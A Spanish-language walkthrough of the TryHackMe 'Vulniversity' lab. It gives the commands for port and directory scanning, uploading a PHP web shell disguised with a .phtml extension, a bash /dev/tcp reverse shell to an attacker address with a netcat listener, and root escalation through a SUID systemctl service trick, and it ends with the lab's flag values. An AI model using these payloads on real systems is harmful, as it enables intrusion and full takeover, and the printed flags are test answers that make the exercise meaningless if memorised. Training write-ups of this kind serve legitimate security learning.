>>>Tryhackme
>>vulniversity

>nmap

>nmap -p- -sS -sC -sV --open --min-rate 2000 -vvv -n -Pn -oN vulniversity 10.10.173.171

•21/tcp  open  ftp         syn-ack ttl 64 vsftpd 3.0.3
•22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
•139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
•445/tcp open  netbios-0   syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
•630/tcp  filtered rda
•3128/tcp open     http-proxy  Squid http proxy 3.5.12
•3333/tcp open     http        Apache httpd 2.4.18 ((Ubuntu))


Vemos que en el puerto 3333 tenemos un http, asi que iremos a ver y si se puede, fuzzear

>fuzz
>gobuster dir -u http://10.10.49.147:3333 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt

•/images
•/css
•/js
•/fonts
•/internal
•/uploads


Vemos que en "/internal" tenemos un upload de files, probaremos inyectar codigo malicioso.

Primero creamos un script en php con el siguiente codigo:

>nano script.phtml
**cambiar el "php" a "phtml" sirve para poder saltar algunas sanitizaciones de la maquina**

<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>

Luego de subirlo ingresamos a "/uploads" y encontramos nuestro codigo.  Lo ejecutamos y luego colocamos "?cmd=whoami" y vemos que si funciona

http://10.10.49.147:3333/internal/uploads/script.phtml?cmd=whoami
•www-data

Ahora para poder ganar un ingreso a la maquina utilizamos el siguiente script para obtener reverse shell

>bash -c 'bash -i >& /dev/tcp/10.18.112.21/443 0>&1'

dicha reverseshell ahora tenemos que urlencodearla para poder ejecutarla

>bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.18.112.21%2F443%200%3E%261%27

Nos ponemos en escucha con netcat en el puerto 443

>nc -nlvp 443

Y ya estamos dentro, ahora toca hacer una shell mas util con el tratamiento de la tty

>script /dev/null -c bash
>control+z
>stty raw -echo; fg
>reset xterm
>export TERM=xterm
>export SHELL=bash

Escala de privilegios

>sudo -V
• sudo version 1.8.16(vulnerable)

Vemos que un usuario es "bill"

>find / -perm -4000 2>/dev/null
•/usr/bin/pkexec

>/usr/bin/pkexec --version
•pkexec version 0.105 (vulnerable)

>/bin/systemctl
(gtfobins nos da escalada en SUID)

Segun gtfobins tenemos que crear un archivo ejecutable ".sh" con el siguiente codigo:

#!/bin/bash

TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "(((comando como root))) > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF

Este script hara que ejecutemos comandos como root, para luego guardarlos dentro de una carpeta llamada "output"

Procedemos a ir a la carpeta donde tenemos permisos de escritura "/tcm"

Necesitamos saber donde estan las rutas de las flags, asi que las buscaremos.

>find / -name user.txt 2>/dev/null
/home/bill/user.txt

Para buscar la ruta de root.txt no nos permite, asi que pasaremos a ejecutar el script.

Damos privilegios de todo tipo al script

>chmod 777 escalada.sh

y ahora ejecutamos

>./escalada.sh

Vemos que se creo un archivo "output"

>cat output
•/root/root.txt

Ya tenemos las rutas, asi que ahora a leer los archivos

user.txt: 8bd7992fbe8a6ad22a63361004cfcedb

root.txt:a58ff8579f0a9270368d33a9966c7fd5"
